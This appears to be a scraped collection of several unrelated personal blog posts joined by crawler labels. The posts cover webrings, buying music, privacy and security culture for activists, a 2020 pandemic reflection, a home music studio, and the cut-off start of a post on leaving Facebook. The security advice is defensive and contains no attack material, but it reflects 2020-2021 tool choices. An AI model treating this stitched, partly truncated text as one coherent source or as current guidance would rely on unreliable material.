It’s the webring many Merveilles folks are featured on among other individuals. I don’t think it has a name, but it’s hosted by Devine Lu Linvega on webring.xxiivv.com. Feel free to explore the more than 140 websites featured there!\n\nThis webring is an attempt to inspire artists & developers to build their own website and share traffic among each other. The ring welcomes personalized websites such as diaries, wikis & portfolios.\n\nWhat Even is a Webring?\nThe Wikipedia on what a webring is:\n\nA webring […] is a collection of websites linked together in a circular structure, and usually organized around a specific theme, often educational or social. They were popular in the 1990s and the early 2000s, particularly among amateur websites.\n\nThat’s basically it in a nutshell. The particular one I am on now is not linked circularly, but acts more as an index for all member websites. A good examples for a circular one is the Low Tech Webring, where all the websites contaon a set of links, mostly in the footer, where you can go directly to the “previous” or “next” website, to cycle through the ring.\nI like the small revival the webring idea goes through currently (at least it feels to me like it is). It takes me back to the times when the web was still new and exciting to me, and not full of bullshit as it is today. I don’t think I’m alone though, since personal websites seem to pop up again here and there, and projects like the IndieWeb seem to have their place as well.\n'] at ['https://irimi.one/posts/webring/']

Found CONTENT ['Sometime about a year ago, I quit my subscription to music streaming services for good, and created a bandcamp account with the intention to buy music again. This had a significant impact on how I listen and relate to music.\nAlbums over Playlists\nWhile I still require a (mostly) instrumental playlist with calm yet engaging music for work, I enjoy listening through albums as a whole a lot more. This has a more deliberate feel to it than just switch on a “backround noise carpet”, and I also feel way more mindful when listening to music like that.\nDiscovering Music Deliberately\nThis relates to the last point. I used to discover new music using the “play music similar to” features that most streaming services provide. This is a very limited experience though, and also contributes to the practice of just mindlessly turning on some background music.\nAlso, those recommendations where usually pretty bad. And I tried a lot of them, believe me. What’s way more exciting is to just look up what label that last cool album was released on, and check out what other artists they publish. Usually the variation in genres and styles is much larger than of those recommendation algorithms, and also seems to span more criteria than these algorithms are capable of considering.\nDiscovering music is also more targeted. I am better able to just go explore a new style of music I know nothing about, or go on an adventure to find out what this vaporwave thing is about.\nI Spend More Money\nThis is one of the downsides for me. I have not much discipline, and when I discover something new I really like, I need to have it. Just having a subscription for ten bucks per month was way cheaper than what I’m doing now, but I still don’t buy anything right away and look for good deals or discography wholesales.\nAt least I know that most of what I spend there is ending up in the artists’s pockets.\nWaaaay More Variety\nThe universe on independent artists on bandcamp alone is so much larger than any mainstream streaming service can provide. Locking myself out of the streaming service’s convenience forces these endless options on me.\nNo More Need for Mainstream Music\nI found myself listening to way more of these niche music, that I didn’t really listen to the mainstream music my collection contained from before anymore. The effect was so large that I just followed through and deleted large parts of it.\n'] at ['https://irimi.one/posts/buying-music/']

My interest was sparked by participation with a few different activist groups in 2019-2020 and amazing classes put together by Tech Learning Collective, which in turn led to a pretty significant amount of independent research. Along the way I’ve had the opportunity to share the basics of what I’ve learned through a blog post that flew pretty far and eventually led to an opportunity to teach an introductory class for folks in independent radio. These notes are nowhere near an exhaustive list of what’s out there, but I wanted to share some of the knowledge I’ve gathered thus far.\n~\nNotes for everyone\n\nNo app is perfect, and everyone’s individual situation is different. That’s where threat modeling comes in. Everyone will make different choices based on the threats they face.\nFor example, if I’m all about security and privacy, why I am I writing all about my life on a website and sharing about my life via a newsletter? It has to do with my own personal situation - I’m not a core organizer. I do not hold sensitive information about activist activities at this point. But I do try and keep my data out of Facebook’s hands.\nA threat that all people in our interconnected global world face is surveillance capitalism. Shoshana Zuboff’s interviews with The Guardian, The Markup and VPRO are a great place to start for information on the topic if you aren’t familiar. (Surveillance capitalism is nothing new.)\nSurveillance capitalism not only undermines personal privacy, but challenges democratic government at its core.\n\n“Data is content, and metadata is context. Metadata can be much more revealing than data, especially when collected in the aggregate.” - Bruce Schneier\n\nMetadata is the “surplus” data that Google built itself upon and that fuels surveillance capitalism. The Markup’s Blacklight and EFF’s Cover Your Tracks can show you the alarming amount of data that companies are collecting about your online activity.\nAs a result, the fact that you might feel “anonymous” - perhaps you used a fake name when signing up for a forum - does not mean you your activities are private or secure.\n\n“The idea that there are tools that would always work for everyone, everywhere; require no extra knowledge and zero additional infrastructure; are fair and just, and protect users at all times, is a dream that has not yet come true.” - Tactical Tech\n\nIf you want to limit surveillance capitalists’ influence on your life, start by using Firefox (or if a novice Chrome user, Brave) rather than Google Chrome. Google was the original surveillance capitalist company. Then add in the uBlock Origin, Privacy Badger, and Decentraleyes browser add-ons. Make sure to also use DuckDuckGo rather than Google Search, and consider leaving corporate social media altogether. (I’m partway through my own journey, but there is still work (especially de-Google-ing) to be done.)\nBecause of advanced fingerprinting techniques, there’s no real perfect system for avoiding trackers. Tor might be your best option if a stronger form of anonymity is required.\nHere are a few resources I use to choose my apps and tools, for both secure and open source alternatives:\n\n\nPrivacyTools.io\nPrism Break\nAlternativeTo.net\nswitching.software\nAwesome Social Distancing\nRomain Aubert’s list of great tools and Google Alternatives\nEFF’s Tool Guides.\n\n\nWhen thinking about companies/apps themselves, the ideal of privacy is inverted - instead of privacy, we seek transparency. That’s why going with open-source, decentralized,  and/or audited tools is recommended where possible.\nDecentralization distributes power. Consequently, trust is distributed among multiple parties, allowing for less of a dependence on a central node but a larger number of potential fail points.\nOne of the challenges in talking about digital security broadly and to a variety of different people is that there are many different potential threats, and they do not affect all of us equally. The digital world is not always safe for overpoliced Black folks or non-cis-men, and sometimes makes stuff like racism and sexism and domestic violence even worse. White men like me need to remember that we do not face the same challenges as others.\nAt the same time, the truth is that everyone has something to hide.\n\n“Saying that you don’t need or want privacy because you have nothing to hide is to assume that no one should have, or could have, to hide anything - including their immigration status, unemployment history, financial history, and health records. You’re assuming that no one, including yourself, might object to revealing to anyone information about their religious beliefs, political affiliations, and sexual activities, as casually as some choose to reveal their movie and music tastes and reading preferences.” - Edward Snowden\n\nSecurity is protection against threats. One way to talk about digital security is via the CIA triad: confidentiality (who has access, a.k.a. privacy), integrity (protecting data), and availability (the system still works for authorized users).\nIn most cases you probably don’t need to buy any anti-virus software. Just set up your system to be as safe as possible using the tools it provides.\n\n\n     \n            Another abstract projection in my kitchen.\n        \n\n\n\nThere is a lot for you to do, however, to keep yourself secure online. Firstly, use a password manager and enable two-factor authentication on your accounts. Make sure to vary both your usernames and passwords (if you need to remember a particular password, try using a passphrase. You can even draw the passphrase words out of a hat or something. You should also add HTTPS Everywhere to your browser to ensure your browsing activity is encrypted through HTTPS.\nMathematically scrambling data - encryption - is one of the most powerful tools we have for maintaining digital security. End-to-end (E2E) encrypted apps like Signal are particularly important and useful. Most people don’t realize that they use encryption every day through HTTPS and core Internet protocols like TLS and S/MIME.\nMake sure to encrypt your computer(s) and phone(s) as well.\nUsing a VPN is not enough if you want to keep your activities secure and private - try Tor, and Signal instead (or in addition to a vetted VPN like ProtonVPN).\n\nNotes for organizers and activists\n\nYou must also stay vigilant. Sophisticated phishing attacks are something that you - and anyone known to be associated with you - will need to be careful of. These aren’t your average spam messages. These are often meant specifically for you, replicating emails and websites that you might use in order to try to get your passwords or personal information. It could look like an email with a link from your bank, email, or social media account, for example - and the link will send you to a site run by the hacker(s). To defend yourself, first educate yourself on phishing techniques. Then turn on two-factor authentication for all of your accounts, preferably either through an authenticator app or even a physical security key.\n\n“In a world where millions of digital communications are silently intercepted, collected, and stored every day, how do activists effectively say ‘I do not consent to this search?’ As in a physical encounter with law enforcement, we must be proactive. Online, this means using encryption along with other privacy-protecting and autonomy-preserving tools.” - Civil Liberties Defense Center\n\nGoing to a protest? See the iPhone Security Guide I put together a few days ago.\nOrganizers who seek to change the world face unique challenges that other folks do not need to deal with. Recent examples, like the doxing of pro-democracy activists in Hong Kong and revelations of private surveillance of animal rights groups and activists, not to mention movies like Judas and the Black Messiah, are reminders of the importance of OPSEC for activists when dealing with “assholes with resources” or even governmental entities.\nOrganizers are not only responsible for their personal security, but the security of their team and their activities. They also face greater risk and exposure due to their prominence within the group.\nWhen it comes to setting standards for a small group or even an entire organization, we have to talk about security culture. This goes way beyond choosing the “right” tools like Jitsi, Signal, and EteSync (etc).\n\n\n\n\nSecurity culture\n\n\n\n\nRegardless of your personal risk level, defaulting to tools that are private and/or secure is the easiest way to maintain a culture that keeps its people safe from online surveillance. The focus on culture, rather than just implementing policy or focusing on individual actions, is something that - funnily enough - I have only run into in two places: the corporate world and the activist world.\n\n\nAt a company like AT&T, security culture is focused on employees shared attitudes and actions related to corporate security policy and the way that affects their overall success. In their own words, security culture requires an “investment” of time and energy.\n\n\nFor organizers, security culture is “a set of customs shared by a community whose members may be targeted, designed to minimize risk.” You should use secure practices from the beginning so that you don’t have to come up with security measures over and over again. It’s a form of collective care as well - a defense against racist tech, doxing, and the far-right. Limiting the amount people know to only what they need to know can also help address issues like undercover surveillance and badjacketing.\n\n\nFor both organizers and corporations, the focus is on culture, not protocol. The focus is on habits, not rules. They use different terms, but the core is the same: security culture is about making security the default - for everything. Security culture is a framework to center when working with others in an activist space. The best way to keep each other safe is to engage in secure practices at all times, not just by using particular tools, but by creating a culture of security.\n\n\n\n\nOne concern for organizers (along with journalists and politicians) is doxing. One preventative steps is to remove as much of your information from data brokers as possible. Here are a few useful guides. If you are doxed, see Equality Labs’ guide for next steps, and seek out help. Cyber Civil Rights Initiative also has an online removal guide. Another potential layer of protection is to use a post office box or service like VirtualPostMail so that you don’t have to include your residential address on public documents. (If you own your property, however, there may be no way to avoid it.)\nOne of the most useful tools for organizers is Tor. Tor harnesses decentralization and encryption to create anonymity. But make sure to sign into accounts you set up on Tor on Tor - never deanonymize yourself by logging in to an anonymous account through a regular browser. (Don’t F it up!)\nAnother useful tool built upon Tor is OnionShare, developed by Micah Lee of The Intercept, which can be used to share files and host .onion hidden services. Micah recently wrote up instructions for how to set up an anonymous dropbox on a Raspberry Pi.\nMany people who use Signal all the time do not take advantage of all of its security features. Make sure to compare safety numbers with people you are in contact with to avoid man-in-the-middle attacks and other vulnerabilities - preferably in an audible manner, on video chat, or in some non-Signal, offline way.\nTo give out your Signal number without publicizing your personal number, see The Intercept‘s guide to using a different phone number on Signal. Make sure to also add a carrier pin to your phone(s). And if you are prominent organizer, having burner phones is probably not a bad idea. Services like MySudo can be an option, but they will be tied to your payment method. (My protester iPhone guide is probably also relevant.)\nA tool built upon Signal that will be useful to many organizers is Signalboost. Check it out.\nIf you need a “burner” email address, your best option is probably ProtonMail, since they don’t require you to connect an existing email address or phone number. Make sure to set it up through Tor and only access it through Tor. Be careful when using ProtonMail - just using the service is not enough to fully secure your communications with PGP encryption. If you just need a disposable address, try Maildrop or 33mail.\nPGP (a.k.a. GPG) is an important and widely-used encryption tool. But its issues are well-documented. Make sure you read up before using it, and remember, only the body of the message is encrypted. Mailvelope is the most user-friendly PGP client I’ve encountered. But skipping PGP and just using Signal is probably your best option.\nWhen using Firefox, consider using an enhanced privacy configuration like the arkenfox user.js.\nAnd even after all this, there are also physical-world threats that intersect with digital security. Some relevant tools include Haven and RF-shielded (a.k.a. Faraday) bags. There are also alternative operating systems appropriate for high-level security.\n\n\n     \n            A third abstract video projected onto my kitchen wall.\n        \n\n\nOne of the challenges with digital security is that it is constantly shifting and changing as new apps are created, new threats are discovered, and they way we engage with technology and the Internet continues to evolve. But seeking to learn how the technological systems we rely on actually work, and taking control of the ways we engage with them, is a political act.\nThere is so much to say on this topic - I haven’t even scratched the surface.

I recommend using ProtonVPN on a regular basis. Another good idea is to download maps onto your phone ahead of time so that you don’t need to use location services on your GPS/maps app.\nWhen livestreaming, avoid showing fellow protesters’ faces, particularly if they are doing something that would garner the authorities’ attention. If you post videos or photos afterward, make sure to blur out faces and potentially identifying details of fellow activists.\nMissing something? Let me know.

EXCEPT DESCRIPTION FOUND: ['[Feel free to listen to my most recent mix while reading if you want some background music.]\nAlthough the beginning and end of the Western calendar year are quite arbitrary, they have become integral to the way that our society thinks about time. For most of 2020, we were complaining about, well, 2020. Beginning with fears of WWIII and wildfires, then a global pandemic and US presidential election, the past year has thrown a lot at us. Somehow, however, there was an inkling of irrational hope that a new year would bring us a better world.\nNow we’re in 2021, and “2020” just keeps coming. Obviously, the pandemic is far from over. And politics in America, spurred on by social media radicalization, continues to deteriorate. Still, I thought it might be useful - to some degree for people in the present, and perhaps also for folks in the future - to reflect on the past calendar year.\n\n     \n            A disposable mask with a broken ear string.\n        \n\n\nThe world, through a screen\nHow do you even write about something like COVID - something that affects everyone?  Whatever your experience has been, it cannot come anywhere close to capturing the full experience of humanity during this time. The experiences are so different, of course on an individual basis, but also along class and racial lines. I’m still employed full-time, while former coworkers and neighbors and friends are without work. I’ve not lost anyone I know to the disease, and yet thousands of people have died.\nAs different as all of our lives are, one shared experience for people in the US is an increased reliance on technology. In a recent newsletter, Tech Learning Collective wrote that, “2020 was, without a doubt, the most Cyberpunk-dystopic year in recorded history.” They continue:\n\nThis was the year of Zoom dinner parties, pandemic-fueled bot-powered Instacart panic-buying, and direct-to-streaming Hollywood releases. The Pirate Bay has never had high-quality TV and movie rips indexed so quickly. Installing a bot to snag grocery delivery slots has never been a mode of survival before. This was the year even the tech-averse were forced into cyberspace for virtual concerts, remote learning, an augmented-reality holiday parade, and contactless-everything.\n\nTechnology, already an enormous part of modern life, has become our way of engaging with everything during quarantine. And for a brief moment, when the pandemic first arrived in the US, it felt like we were united against something for once - the disease.\n\n     \n            Some tea packets and tags.\n        \n\n\nThat feeling did not last for long. After all, with 24/7 news cycles and social media, we experience life very differently from one another and from humans in times past. Now, far-away events can affect our emotions more than activities close to home. Political affiliation defines our identity; the global is personal. And as Internet use increased during lockdown, our slowly diverging realities pulled apart even further and at a greater rate.1\nDuring this year, I came to realize the degree to which we no longer have a shared reality. I’m not just talking about politics. We see different memes and content; we hear about different celebrities; we see different kinds of social media posts; we read different blogs. Sure, we’ve all always had our own lives and experiences. What is different is that, for many people, their reality is now organized for the profit of Silicon Valley venture capitalists and NYSE investors who profit from algorithmically cultivating these realities - competing visions for how the world actually works.2\nAt first, when the pandemic hit, I dove into Facebook, seeking socialization. I was particularly active after the killing of George Floyd in late May. But over time, as the intensity of these diverging realities started to grow - and my attempts to connect with other people saw little assistance from the algorithms - I realized that there wasn’t much for me to accomplish on the platform itself. Rather than socialization and connection, my social media experience was one of visceral and vicarious chaos.\n\n     \n            Some banjo picks.\n        \n\n\nI shifted my attention toward the ways I, myself, was interacting with technology. Although I have always used the computer a lot, I was now at a desk more than ever before. I started to reconsider the way I approach the Internet3 and took on a number of related projects:\n\nBuilding this low-energy, self-hosted website.\nAttempting to solar-power it - but I didn’t quite get the right equipment, and our apartment doesn’t get enough sunlight anyway. I learned a lot, but eventually decided to give up for now.\nStopping using Facebook and Instagram - I hadn’t decided to leave yet.\nGoing through the many linked articles and content I had collected over the years. Some of it I threw away, and the rest I rearranged so that it would be more useful for me. (This is a work in progress. More on this in a future post.)\nCleaning out my Google Drive, moving a bunch of old stuff to offline storage.\nDeciding to re-start my personal newsletter, this time having folks to opt in rather than importing an email list.4\nLearning a bunch from Tech Learning Collective about technology and security.5\nStarting to think a lot more about the ways that I keep in touch with people. Who facilitates my communications? Do I trust them with my personal information?\nCommitting to leaving Facebook and Instagram.\n\nAs I continue to engage with technology, using more open source tools, relying less on big business and more on myself and online communities, I hope I can also inspire others to do the same.\nTechnology is not going anywhere, and it is amazing how little most of us know about how the Internet, for instance, actually works. Not everyone needs to be a developer, but I believe that if we all had a better understanding of the apps and programs we use, we would be a lot better at fixing the broken systems we’re contending with right now. As we move into 2021, I’m feeling more confident, and more competent. I’m no code whiz, but I know my way around a bit better. I plan to continue to learn and grow in the new year.\nMaking music in the middle of all this\nOne of the tensions at the heart of my musicmaking practice has been the push and pull of professional and personal. My background in music in the classical world always emphasized the professional aspects of sound, but during college, studying free improvisation with Rui Li was an entry point into more intimate ways of engaging with my instruments. Since I graduated music school and started making electronic music, that push and pull has remained.\nMusic for Fifteen Emails\nWhen the pandemic first shut things down in mid-March, I threw myself into the professional side of my work. I had been listening to a great deal of environmental music, especially the work of Hiroshi Yoshimura. I had also been recording a lot with one of the instruments Hiroshi used, the Yamaha FB-01. Without really thinking about it too much, I instinctively seized on the opportunity to work on something I had wanted to work on for a while: a new album.\nMy connection with environmental music only increased as it soothed me during a time of extreme change. I put in several hours per day after work, racing through it because I really felt it was the right music for the right time. (I have heard from friends that I was right - it did fit the time. And depending on how your life is now, it still might be.)\n[Listen to Part One]\n\nWith Music for Fifteen Emails, I chose to experiment in a lot of different ways - I had not done anything like it before, in terms of genre, in terms of making music on a grid (sort-of) in terms of getting serious about mixing, and mastering myself (paying monthly for a mastering suite via Splice) rather than paying someone else. The album burgeoned into a double-album and I released it in April, after about a month of quarantine-fueled labor.\nI decided that this time I would spend more time exploring promotion and distribution. I switched from Distrokid to CDBaby since CDBaby is a single payment and allows multiple artists. I also used SubmitHub to try and bring attention to my music - a first for me. It resulted in a few playlistings and blog reviews - more attention than my releases usually get - but not as much as I had hoped. I also used my personal Instagram more than I ever had before, and even paid for an ad on that platform for the first time (this is before I decided to leave Instagram).\n[Listen to Part Two]\n\nI don’t know if the promotional work can be characterized as a success, but it was a useful experiment. The feedback that brings me the most joy is that of my friends who have enjoyed it the most and shared with me how they continue to listen to it to this day: A.M., J.W., L.V., and L.R.\nMusic for self-reflection\nI recognize now that putting all of that time into the album was a coping mechanism. After I released and promoted Music for Fifteen Emails, for a while, I didn’t work on music very much, and I started to get swept away by the news cycle and social media. After all, with the complete collapse of the performing arts, there weren’t really any opportunities to perform live, and I wasn’t sure that I really felt like it anyway.\nStill, I continued to make music just for myself - the personal side of my music practice. At one point in late spring, my partner and I ran across a snail moving alongside the sidewalk in the park. I decided to play a little song to go along with the video footage we collected:\n\n\n  \n\n\nFor a while in late spring, the social uprising and Black Lives Matter movement occupied my mind and time (well, it still does) to a degree that there was not space in my life for musicmaking. I also realized during that time that COVID was not ending anytime soon. The weight of that realization, combined with police brutality and the onset of the general election season in June/July, meant that I did not really feel musical. Instead, I distracted myself with basketball, and with cooking, and with building a home routine with my partner.\nEventually, however, I started to feel the need to make music again. Music helps me to process the world around me, and the emotions within me, and my relationships and experiences. I was overwhelmed, but as I adapted to the situation we were in in fall 2020 - as humans do - I started to try and process those experiences. Sometimes, I just improvised on my keyboard - letting it all out. Other times, I tried to approach the instrument with more intention.\n\n     \n            More banjo picks.\n        \n\n\nAs the year went on, I moved farther and farther into quiet. My recordings were peppered with longer tones and deconstructed melodies. Improvisations, rather than compositions - perhaps because my ability to create order felt like it was slipping away in all of the chaos surrounding us.\nIn September, I went on a walk to a nearby grocery store and pulled out my phone to record the trip. When I got back, I decided to record over it - a single long improvisation.\n\nHere is what I later wrote about the piece, entitled In the Middle of All This:\nPopular music, especially in the age of the Digital Audio Workstation, is constructed almost 1 millisecond at a time. Every note, every harmony, every effect is dissected and reconstructed over and over again until is is absolutely perfect. Live performances are often filtered and shaped to resemble that magical “take."\nIn the Middle of All This is a piece that rejects the impulse to finish. It rejects, even, the impulse to edit (beyond matching levels and removing loud pops). It consists of two field recordings, digitally scotch-taped together to resemble just one (they were separated in reality by a 20 minute grocery run), with a later improvisation recorded over the field recording(s). It is a simple diorama - nothing sophisticated.\nThe improvisations take the form of deconstructed musical ideas, sometimes taking cues from the field recording, sometimes coming from within the performer himself (a white dude sitting in his apartment in West Harlem in the middle of a pandemic). If you played them on top of one another, they could almost make a song. But they don’t.\nThe world feels just a little bit like it is coming apart. I’m not sure if “deconstructed” is the right word for the way I think about it - that feels somehow to purposeful. But as a musician, I didn’t feel like I would be reflecting the world I see by putting together a cohesive musical unit. I’m not sure if I had the emotional strength to offer one either. The best I could do was these almost-but-not-quite-hopeful motives.\n(I’m super excited for this piece to be included in Jip Gallery‘s next exhibition.)\nA month later, I decided to sit down and record a drone EP, In those places, we are the ghosts.\n\nI’d been wanting to make some drone for a while, but I never felt fully inspired to do so until October 2020. Perhaps it had to do with the darkness of the year, or the spooky Halloween vibes that felt so right, but I wanted to make something a bit grungier, a bit darker, and a bit more indulgent.6\nMusic + tech\nDuring the last couple months of the year, I have entered into another period of technical experimentation. I’m playing with beatmaking, various livecoding languages, Max MSP, 3D spatial audio, and video synthesis.\nWhen you are put under stress, sometimes you find out what matters most to you. No matter what happens, or where my career takes me, or how much money I have, music will always be an important part of my life. It’s magic. Whether I am the listener, curator, or performer, active engagement with sound rarely fails to restore me.\nQuarantine lifestyle log\nSpring\nI have been super fortunate: no deaths in my immediate extended family, not fired/furloughed/laid off, no COVID - or at least no symptoms and no positive tests. The reality is, the biggest impacts on me, personally, were on my lifestyle.\nAlthough I’ve always been partial to just staying at home on the weekends, there were always things that drew me out of the apartment. Whether it was the 50th-anniversary gala I was working on at the time, museum ethics organizing, or climate activism,7 my life changed dramatically when the world ground to a halt - and I know I’m hardly unique in that.\nMy work life, however, continued on, at least initially unchanged. I already worked from home on the Fractured Atlas team. Eventually, Fractured Atlas would be affected greatly by COVID, due to layoffs and the great challenges that our member artists faced, but at first, I felt lucky that we didn’t have to changing our protocols very much.8\nEarly on, I began to engage in mutual aid where I could. I supported a few individuals directly and also started delivering groceries on a regular basis. As you may remember, the initial spike in NYC was intense, and groups like Invisible Hands mobilized to support at-risk folks in our communities. When we thought it was only going to last a short time, we also took on some classic stuck-at-home activities: puzzles and board games.\nOne time, when my partner and I were sitting around in quarantine, maybe a month-and-a-half in, we decided to make a zine as a way off remembering that strange time. We gathered various items from our pandemic experience - Cheddar Sour Cream Ruffles bags, Chinese take-out sauce packets, banjo picks, and, of course, disposable masks, and arranged them on my flatbed scanner.\n\n     \n            A bunch of unused Chinese takeout sauce packets.\n        \n\n\nNaturally, that idea died away pretty quickly once we realized that the pandemic was not going to be over anytime soon. But that was my first realization that these times should be documented - the first, in a way, of many attempts to write about 2020. The scans from that evening are the images you see spread throughout this post.\nSummer\nWhile people on short-term leases and those with means left the city, we decided to stay. Eventually, my partner and I settled into a rhythm: working during the day, taking turns cooking9 and doing the dishes, daily walks, watching road cycling or maybe The Last Airbender, playing Overwatch, my partner playing banjo, weekly family chats, takeout once per week (occasionally cheating and picking up a pizza), and reading together in the evenings. We also started indoor composting, added some house plants, and did some virtual game nights. None of it particularly notable, except for how damn reliable it was.\n\n\n  \n\n\nWhen George Floyd was killed, like many others, we sprung into action and marched the streets, probably two out of every three days. We decided to chance the subways and, other than delivering groceries, it was probably the most we were outside the entire year. Once the uprising started to die down, things for us, strangely, got back to “normal.”\nJournal, 08/19/2020, 1:36am\n\nI have this nagging feeling that I am not doing something that I am supposed to be doing. But there isn’t anything. It’s strange. Hopefully, it’s just cabin fever. I guess I should just go to sleep.\n\nAutumn\nLooking back at the year, the autumn is almost a blank spot in my memory. To some degree, every day was the same. I went to the Socrates Sculpture Park for a masked and socially-distanced hang with a couple of friends, and was blown away by the simple pleasure of it all. There were a couple short trips upstate, and one longer one to the Adirondacks that helped my partner and I to recharge. I started to look for a new job, and in the process joined the team part-time at Open Collective. Eventually, at the end of the year, I left Fractured Atlas and joined Donorly.\n\n     \n            A scan of a Cheddar Sour Cream Ruffles bag.\n        \n\n\nOne of the most difficult parts of the lockdown for us was being away from our families for so long. With both of us having at-risk people in our family bubbles, we had to proceed with extreme care. We eventually decided to take a six-week trip at the end of the year to see our folks in the Midwest - three weeks each - and due to our precautions no one got sick.\nThe weird part about writing about pandemic life right now is that it hasn’t ended. We’re back in the city and have many of the same patterns. It seems like the vaccine will make 2021 a better year than 2020. But if this year has taught me anything, it’s to take nothing for granted. Come what may - after 2020, I’m ready for anything.\nFeelings\nThe year 2020 was filled with emotions. Anger at injustices like police brutality, government mishandling of COVID, fellow citizens’ lack of care for the broader community, various politicians, and, you know, everything. Sadness for colleagues and friends whose lives were uprooted. Loneliness.\nSometimes I felt like I was floating through time - simultaneously untethered from reality and stuck in the same place. At other times, I was just bored. There were moments of fear as well, especially in the midst of great uncertainty. Fear of the future. Fear of death.\nBut there were also moments of great joy and brilliance. Though they were often overshadowed, those moments are the ones I cling to. I hope that you can do the same.\n\n\n\n\nYes, to some degree people have always chosen news based on their viewpoint. But the niche-enabling dynamics of cable TV made being different profitable. On the Internet, it’s cable times a million. ↩︎\n\n\nNote: this is different from having conflicting opinions. We don’t even share the same basic facts about what IS on a basic level vs what IS NOT.

EXCEPT DESCRIPTION FOUND: ['My music studio (i.e., a little corner of our little office) is ever-changing. Instruments and gear come and go. Workflows ebb and…flow. This is the first post in a “music studio” series where we check in on what tools I’m currently using for my audio work.1\nGear\nBecause of the limited space in my NYC apartment, my music studio is relatively small, occupying just 1/3 of the space in the “office” of our 2BR living space.\n\n     \n            A photo of my music studio, described below.\n        \n\n\nHere’s a list of the gear in the set-up shown above:\n\nElektron Digitakt drum computer/sampler\nDIY-built Monome Norns sound computer\nYamaha FB-01 half-rack 4-operator FM synth module\nArturia Keystep midi keyboard/sequencer\nFocusrite Saffire 4i4 (3rd gen) audio interface/sound card\nMackie 1202-VLZ3 12-channel analog mixer\na pair of JBL LSR305 powered monitors (speakers)\nZoom H1n audio recorder\ncheap Samson SR850 headphones\nLaptop, monitor, laptop stand, milk crate, powered USB hub, keyboard, mouse\nA bunch of audio cables\n\nWith the exception of the DIY Monome Norns, which I bought a kit for and assembled myself, and little things like the keyboard, mouse and USB hub, this equipment was bought used online. I’ve done a lot of buying and selling, going back to Spring 2017.2 The FB-01, although it has some noise issues, has been a real treat, and it is currently the only vintage gear in my workflow. The Norns adds some flexibility/mystery/inspiration to the setup, since it can serve many different purposes depending on what program it is running. The laptop is the core of the setup, and rest of the equipment is mostly functional.\nRouting\nAudio\nThe center hub of audio routing is the 12-channel mixer (1202). The best thing about this particular mixer - other than the fact that it fits inside the milk crate perfectly - is its flexible routing features that allow me to route signals to multiple sources.\nTo start, the external sources, in this case the Norns and FB-01, send audio into the mixer. I can play them without my laptop by sending their audio into the main outs of the mixer, which in turn sends audio out to the monitors/speakers and Zoom audio recorder. The 1202’s mute buttons also allow me to send thse external signals to an alternate bus that goes through the audio interface to my computer/DAW. This allows for a pseudo cue system, of sorts. I then have the outputs running from my computer, through the interface, back into the main mixer.\nAdditionally, I can send audio out to the Norns (and other hardware effects I use from time to time) using the two FX sends on the mixer. Rather than using the mixer’s stereo returns, I prefer to use a regular input channel for each FX return, for maximum flexibility and control.\nMIDI\nMy main MIDI controller is the Keystep. I usually have it running via USB into my computer. I also connect it via a standard 5-pin MIDI cable to the Yamaha FB-01. Occasionally, I will connect it to the Norns via USB instead.\nThe other important MIDI connection is the Sevilla host-to-host USB MIDI daptor, which allows me to send messages between the Norns (which is itself a computer/MIDI host) and my laptop. This is really useful for integrating the Norns into my setup.\nThe Digitakt can also do some MIDI stuff, but I am not currently using it in that capacity. Something to explore later!\nComputer Programs\nMy Windows laptop is at the heart of the setup. At the moment, I am still most comfortable using audio, MIDI, and virtual instruments/plugins in my DAW, Ableton Live 10, but I recently took a class on 3D immersive sound design using Unity and FMod. I’m quite intrigued and will probably look more into this over the coming months as an interesting delivery method/venue for my music. I have also been learning the very basics of Max 8 and a little bit of SuperCollider. We will see where all this leads!\nI’ve collected a lot of VSTs over the years, and it is not worth listing them all here. Instead, I’ll list some of the plugins and instruments I’ve been using the most lately:\n\nFelt Instruments Lekko and Jasno\na PureData emulation of the Lyra-8\nValhalla plugins\nArturia V Collection 7\nvarious Airwindows plugins\nFull Bucket Korg emulation VSTs\nAmazing Noises Granular Mirror Maze\n\nSample-wise, I think I’m most excited about a big library of Elektron Machinedrum samples I recently downloaded. I’m also looking forward to exploring some vintage MFB drum samples as well.\nDisclaimer\nI am well aware of the limitations of buying music gear, and suspicious of the online culture of “G.A.S.” (gear aquisition syndrome) that is encouraged by music tech manufacturers.3 It can be tempting to think that a piece of gear is the only thing that you need to have the “perfect sound.” Besides the fact that there is no such thing as perfect, it is also important to remember that no piece of gear will make your music “better.” It can make music sound professionally produced…but plenty of professionally-produced music is bad!\nAt the same time, “haptic feedback” - learning by touch/feel - can be a useful way to engage with music, especially when learning synthesis. There is nothing like turning the cutoff knob on an actual synthesizer. The physical exploration of the instrument can help you understand what is happening and allow for more natural exploration than what you experience on a computer.\nAfter owning several analog synths and other hardware, I have come back around to primarily using software. This is partly because of a lack of space, but also it helps to save money - hardware is expensive!\nFrom time to time, I run into folks who are purists about some sort of music format. Whether it is Eurorack, tabletop, vintage synths, pure DAW setups, rack gear, or whatever else they come up with, don’t follow a standard or format just “because.” Don’t think about how your desk is going to look. Follow the sound. Focus on the results rather than aesthetics. And please don’t be afraid to have a laptop on stage.\n~\nIf you want to chat about music tech and gear, hit me up! I would love to talk about the highs and lows of building a productive music studio.\n\n\n\n\nMore interested in the results? Check out my Bandcamp page. ↩︎\n\n\nAt some point on this website I’ll have to reflect on some of my favorites that I had to let go, like the Behringer SH-101 clone and Korg MS-20 mini that I just simply do not have space for. The Behringer rack reverb I used to have was also great. These have been replaced by VSTs from folks like Valhalla and Full Bucket. ↩︎\n\n\nIt is for this reason that I do not link from this page to any stores or gear sites. ↩︎\n\n\n\n'] at ['https://natehn.com/posts/music-studio-nov-2020/']

EXCEPT DESCRIPTION FOUND: ['\n     \n            A photo of me at a bowling alley.\n        \n\n\nWhy\nAlthough there have been plenty of fun moments on the platform, and meaningful, valuable interactions, the truth is that I’ve spent most of my time scrolling, searching, looking for something that was never there. When I look back, my memory of Facebook is primarily connected with a deep social anxiety. The attention-grabbing notifications. The rollercoaster of self-worth. Every minute without a “like” was a failure. Every comment was a triumph. And even as I matured, those core feelings have never really left me.\nLike many people, it took me a while to realize that the News Feed was not really a “public square.” My engagement with friends on the platform was governed by the whims of an algorithm that cared little for my health or the health of my relationships. Notifications did not signal authentic interactions, but rather served to keep me on the website. Every day, without my knowing it, the technology took advantage of my underlying psychology, using sophisticated, calculated tricks to hold my attention and show me more ads.\n\n     \n            A photo of someone throwing water at me with a bucket.\n        \n\n\nMany of you will be familiar with the saying that “If you aren’t paying for the product, you are the product.” In The Social Dilemma,1 a documentary film about social media, Jaron Lanier puts a finer point on it:\n\nIt’s the gradual, slight, imperceptible change in your own behavior and 